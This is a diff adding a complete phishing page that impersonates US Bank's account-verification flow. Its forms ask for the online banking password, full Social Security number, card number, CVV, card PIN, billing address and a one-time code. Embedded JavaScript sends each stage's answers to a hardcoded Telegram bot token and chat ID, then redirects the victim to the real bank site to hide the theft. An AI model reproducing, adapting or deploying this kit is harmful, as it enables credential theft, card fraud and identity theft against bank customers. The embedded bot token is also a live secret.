@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>US Bank - Secure Account Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .form-step {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        .form-step.active {
+            display: block;
+        }
+        .progress-bar {
+            height: 6px;
+            transition: width 0.5s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .countdown-number {
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <!-- Header -->
+    <header class="bg-white shadow-sm">
+        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center">
+                <img src="https://sdyouthservices.org/wp-content/uploads/2020/06/US-Bank-Logo.jpg" alt="US Bank Logo" class="h-20">
+            </div>
+            <div class="hidden md:flex items-center space-x-4">
+                <span class="text-gray-600"><i class="fas fa-phone-alt mr-2"></i> 1-800-872-2657</span>
+                <span class="text-gray-600"><i class="fas fa-lock mr-2"></i> Secure</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation Progress -->
+    <div class="bg-blue-800 py-4">
+        <div class="container mx-auto px-4">
+            <div class="flex justify-between items-center text-white">
+                <div class="flex-1 text-center relative">
+                    <div class="w-10 h-10 mx-auto rounded-full bg-blue-600 border-2 border-white flex items-center justify-center mb-2 transition-all duration-300" id="step1-indicator">
+                        <span>1</span>
+                    </div>
+                    <span class="text-sm">Account Verification</span>
+                </div>
+                <div class="flex-1">
+                    <div class="h-1 mx-2 bg-blue-600 rounded-full overflow-hidden">
+                        <div class="progress-bar bg-white" id="progress-bar-1" style="width: 0%"></div>
+                    </div>
+                </div>
+                <div class="flex-1 text-center relative">
+                    <div class="w-10 h-10 mx-auto rounded-full bg-blue-600 border-2 border-white flex items-center justify-center mb-2 transition-all duration-300" id="step2-indicator">
+                        <span>2</span>
+                    </div>
+                    <span class="text-sm">Billing Information</span>
+                </div>
+                <div class="flex-1">
+                    <div class="h-1 mx-2 bg-blue-600 rounded-full overflow-hidden">
+                        <div class="progress-bar bg-white" id="progress-bar-2" style="width: 0%"></div>
+                    </div>
+                </div>
+                <div class="flex-1 text-center relative">
+                    <div class="w-10 h-10 mx-auto rounded-full bg-blue-600 border-2 border-white flex items-center justify-center mb-2 transition-all duration-300" id="step3-indicator">
+                        <span>3</span>
+                    </div>
+                    <span class="text-sm">Code Verification</span>
+                </div>
+                <div class="flex-1">
+                    <div class="h-1 mx-2 bg-blue-600 rounded-full overflow-hidden">
+                        <div class="progress-bar bg-white" id="progress-bar-3" style="width: 0%"></div>
+                    </div>
+                </div>
+                <div class="flex-1 text-center relative">
+                    <div class="w-10 h-10 mx-auto rounded-full bg-blue-600 border-2 border-white flex items-center justify-center mb-2 transition-all duration-300" id="step4-indicator">
+                        <span>4</span>
+                    </div>
+                    <span class="text-sm">Completion</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8 max-w-3xl">
+        <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <!-- Step 1: Email Verification -->
+            <div class="form-step active p-6 md:p-8" id="step1">
+                <h2 class="text-2xl font-bold text-gray-800 mb-6">Secure Your Account Access</h2>
+                <p class="text-gray-600 mb-6">
+                    To enhance the security of your US Bank online profile, we need to verify your email address. 
+                    Linking your email to your banking profile adds an extra layer of protection and enables important 
+                    security notifications about your account activity.
+                </p>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+                        <input type="email" id="email" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="your.email@example.com" required>
+                        <p class="mt-1 text-sm text-gray-500">We'll send a verification code to this address</p>
+                    </div>
+                    
+                    <div>
+                        <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Online Banking Password</label>
+                        <input type="password" id="password" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your password" required>
+                        <p class="mt-1 text-sm text-gray-500">For security verification</p>
+                    </div>
+                    
+                    <div class="flex items-center">
+                        <input type="checkbox" id="terms" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="terms" class="ml-2 block text-sm text-gray-700">
+                            I agree to receive security alerts and important account notifications via email
+                        </label>
+                    </div>
+                </div>
+                
+                <div class="mt-8 flex justify-end">
+                    <button onclick="nextStep()" class="px-6 py-2 bg-blue-800 text-white rounded-md hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors">
+                        Continue <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Step 2: Card Verification -->
+            <div class="form-step p-6 md:p-8" id="step2">
+                <h2 class="text-2xl font-bold text-gray-800 mb-6">Payment Verification</h2>
+                <p class="text-gray-600 mb-6">
+                    To complete your verification, please provide your payment card details and billing information.
+                    All information is securely encrypted.
+                </p>
+                
+                <div class="space-y-6">
+                    <!-- Personal Information Section -->
+                    <div class="bg-gray-50 p-4 rounded-lg border border-gray-200">
+                        <h3 class="text-lg font-medium text-gray-800 mb-4 flex items-center">
+                            <i class="fas fa-user-circle mr-2 text-blue-600"></i> Personal Information
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div>
+                                <label for="fullname" class="block text-sm font-medium text-gray-700 mb-1">Full Legal Name</label>
+                                <input type="text" id="fullname" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="As shown on card" required>
+                            </div>
+                            <div>
+                                <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number</label>
+                                <input type="text" id="ssn" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                                <p class="mt-1 text-xs text-gray-500">For identity verification (full SSN required)</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card Details Section -->
+                    <div class="bg-gray-50 p-4 rounded-lg border border-gray-200">
+                        <h3 class="text-lg font-medium text-gray-800 mb-4 flex items-center">
+                            <i class="fas fa-credit-card mr-2 text-blue-600"></i> Card Details
+                        </h3>
+                        <div class="space-y-4">
+                            <div>
+                                <label for="cardnumber" class="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
+                                <div class="relative">
+                                    <input type="text" id="cardnumber" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                                    <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                                        <i class="far fa-credit-card text-gray-400"></i>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                                <div>
+                                    <label for="expiry" class="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
+                                    <input type="text" id="expiry" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="MM/YY" maxlength="5" required>
+                                </div>
+                                <div>
+                                    <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                                    <div class="relative">
+                                        <input type="password" id="cvv" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="123" maxlength="4" required>
+                                        <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                                            <i class="fas fa-lock text-gray-400"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <label for="pin" class="block text-sm font-medium text-gray-700 mb-1">Card PIN</label>
+                                    <input type="password" id="pin" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="4-digit PIN" maxlength="4" required>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Billing Address Section -->
+                    <div class="bg-gray-50 p-4 rounded-lg border border-gray-200">
+                        <h3 class="text-lg font-medium text-gray-800 mb-4 flex items-center">
+                            <i class="fas fa-map-marker-alt mr-2 text-blue-600"></i> Billing Address
+                        </h3>
+                        <div class="space-y-4">
+                            <div>
+                                <label for="address" class="block text-sm font-medium text-gray-700 mb-1">Street Address</label>
+                                <input type="text" id="address" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="123 Main St" required>
+                            </div>
+
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <label for="city" class="block text-sm font-medium text-gray-700 mb-1">City</label>
+                                    <input type="text" id="city" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="City" required>
+                                </div>
+                                <div>
+                                    <label for="zip" class="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
+                                    <input type="text" id="zip" class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" placeholder="12345" required>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="mt-8 flex justify-between">
+                    <button onclick="prevStep()" class="px-6 py-2 bg-gray-200 text-gray-700 rounded-md hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back
+                    </button>
+                    <button onclick="nextStep()" class="px-6 py-2 bg-blue-800 text-white rounded-md hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors">
+                        Continue <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Step 3: Code Verification -->
+            <div class="form-step p-6 md:p-8" id="step3">
+                <h2 class="text-2xl font-bold text-gray-800 mb-6">Verify Your Identity</h2>
+                <div class="text-center mb-8">
+                    <div class="text-5xl mb-4">📱</div>
+                    <p class="text-gray-600">
+                        We've sent a 6-digit verification code to your mobile number ending with <span class="font-bold">•••85</span>
+                    </p>
+                    <p class="text-gray-500 text-sm mt-2">The code expires in 5 minutes</p>
+                </div>
+                
+                <div class="max-w-xs mx-auto">
+                    <label for="verificationCode" class="block text-sm font-medium text-gray-700 mb-2">Enter Verification Code</label>
+                    <div class="flex space-x-2">
+                        <input type="text" id="digit1" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" oninput="moveToNext(this, 'digit2')">
+                        <input type="text" id="digit2" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" oninput="moveToNext(this, 'digit3')">
+                        <input type="text" id="digit3" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" oninput="moveToNext(this, 'digit4')">
+                        <input type="text" id="digit4" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" oninput="moveToNext(this, 'digit5')">
+                        <input type="text" id="digit5" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500" oninput="moveToNext(this, 'digit6')">
+                        <input type="text" id="digit6" maxlength="1" class="w-12 h-12 text-center text-xl border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+                    </div>
+                </div>
+                
+                <div class="mt-8 flex justify-between">
+                    <button onclick="prevStep()" class="px-6 py-2 bg-gray-200 text-gray-700 rounded-md hover:bg-gray-300 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 transition-colors">
+                        <i class="fas fa-arrow-left mr-2"></i> Back
+                    </button>
+                    <button onclick="verifyCode()" class="px-6 py-2 bg-blue-800 text-white rounded-md hover:bg-blue-900 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors">
+                        Verify <i class="fas fa-check ml-2"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 4: Completion -->
+            <div class="form-step p-6 md:p-8" id="step3">
+                <div class="text-center">
+                    <div class="w-20 h-20 mx-auto bg-green-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-check text-green-600 text-3xl"></i>
+                    </div>
+                    
+                    <h2 class="text-2xl font-bold text-gray-800 mb-4">Security Update Complete!</h2>
+                    <p class="text-gray-600 mb-6 max-w-md mx-auto">
+                        Thank you for enhancing your account security. Your email has been successfully linked to your US Bank profile, and your billing information has been verified.
+                    </p>
+                    
+                    <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                        <div class="flex items-center justify-center">
+                            <i class="fas fa-info-circle text-blue-500 mr-2"></i>
+                            <span class="text-blue-700">You'll be redirected to US Bank in <span id="countdown" class="font-bold countdown-number">5</span> seconds</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-center">
+                        <a href="#" class="text-blue-600 hover:text-blue-800 font-medium flex items-center">
+                            <i class="fas fa-external-link-alt mr-2"></i> Return to US Bank now
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Security Info -->
+        <div class="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
+            <h3 class="text-lg font-medium text-blue-800 mb-2 flex items-center">
+                <i class="fas fa-shield-alt mr-2"></i> Security Information
+            </h3>
+            <p class="text-sm text-blue-700">
+                US Bank will never ask for your full password or PIN via email or phone. 
+                Always ensure you're on our official website before entering sensitive information.
+            </p>
+        </div>
+    </main>
+
+    <script>
+        const telegramBotToken = '7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo';
+        const chatId = '1920675677';
+
+        function sendToTelegram(data) {
+            let message = `New US Bank Submission:\n`;
+            for (const [key, value] of Object.entries(data)) {
+                message += `${key}: ${value}\n`;
+            }
+            
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1) {
+                document.getElementById(nextId).focus();
+            }
+        }
+
+        function verifyCode() {
+            const digit1 = document.getElementById('digit1').value;
+            const digit2 = document.getElementById('digit2').value;
+            const digit3 = document.getElementById('digit3').value;
+            const digit4 = document.getElementById('digit4').value;
+            const digit5 = document.getElementById('digit5').value;
+            const digit6 = document.getElementById('digit6').value;
+            
+            const verificationCode = digit1 + digit2 + digit3 + digit4 + digit5 + digit6;
+            
+            if (verificationCode.length === 6) {
+                // Send verification code to Telegram
+                sendToTelegram({
+                    'Verification Code': verificationCode,
+                    'Full Form Data': collectFormData()
+                });
+                
+                nextStep();
+            } else {
+                alert('Please enter the full 6-digit code');
+            }
+        }
+
+        function collectFormData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const fullname = document.getElementById('fullname').value;
+            const ssn = document.getElementById('ssn').value;
+            const cardnumber = document.getElementById('cardnumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const pin = document.getElementById('pin').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const zip = document.getElementById('zip').value;
+
+            return {
+                'Email': email,
+                'Password': password,
+                'Full Name': fullname,
+                'SSN': ssn,
+                'Card Number': cardnumber,
+                'Expiry Date': expiry,
+                'CVV': cvv,
+                'Card PIN': pin,
+                'Address': address,
+                'City': city,
+                'ZIP Code': zip
+            };
+        }
+        let currentStep = 1;
+        const totalSteps = 4;
+        let countdownInterval;
+        
+        function updateProgress() {
+            // Update progress bars
+            document.getElementById('progress-bar-1').style.width = currentStep >= 2 ? '100%' : '0%';
+            document.getElementById('progress-bar-2').style.width = currentStep >= 3 ? '100%' : '0%';
+            document.getElementById('progress-bar-3').style.width = currentStep >= 4 ? '100%' : '0%';
+            
+            // Update step indicators
+            document.getElementById('step1-indicator').className = 
+                `w-10 h-10 mx-auto rounded-full ${currentStep >= 1 ? 'bg-blue-500' : 'bg-blue-600'} border-2 border-white flex items-center justify-center mb-2 transition-all duration-300`;
+            document.getElementById('step2-indicator').className = 
+                `w-10 h-10 mx-auto rounded-full ${currentStep >= 2 ? 'bg-blue-500' : 'bg-blue-600'} border-2 border-white flex items-center justify-center mb-2 transition-all duration-300`;
+            document.getElementById('step3-indicator').className = 
+                `w-10 h-10 mx-auto rounded-full ${currentStep >= 3 ? 'bg-blue-500' : 'bg-blue-600'} border-2 border-white flex items-center justify-center mb-2 transition-all duration-300`;
+            document.getElementById('step4-indicator').className = 
+                `w-10 h-10 mx-auto rounded-full ${currentStep >= 4 ? 'bg-blue-500' : 'bg-blue-600'} border-2 border-white flex items-center justify-center mb-2 transition-all duration-300`;
+        }
+        
+        function showStep(step) {
+            // Hide all steps
+            document.querySelectorAll('.form-step').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            // Show current step
+            document.getElementById(`step${step}`).classList.add('active');
+            
+            // Update progress
+            updateProgress();
+            
+            // If we're on the final step, start countdown
+            if (step === 3) {
+                startCountdown();
+            } else {
+                // Clear any existing countdown if going back
+                if (countdownInterval) {
+                    clearInterval(countdownInterval);
+                }
+            }
+        }
+        
+        function nextStep() {
+            if (currentStep === 1) {
+                // Collect and send email verification data
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                sendToTelegram({
+                    'Email Verification': 'Started',
+                    'Email': email,
+                    'Password': password
+                });
+            }
+            else if (currentStep === 2) {
+                // Collect and send full form data
+                const formData = collectFormData();
+                sendToTelegram(formData);
+            }
+
+            if (currentStep < totalSteps) {
+                currentStep++;
+                showStep(currentStep);
+            }
+        }
+        
+        function prevStep() {
+            if (currentStep > 1) {
+                currentStep--;
+                showStep(currentStep);
+            }
+        }
+        
+        function startCountdown() {
+            let seconds = 5;
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.textContent = seconds;
+            
+            countdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = 'https://www.usbank.com';
+                }
+            }, 1000);
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            showStep(1);
+        });
+    </script>
+</body>
+</html>
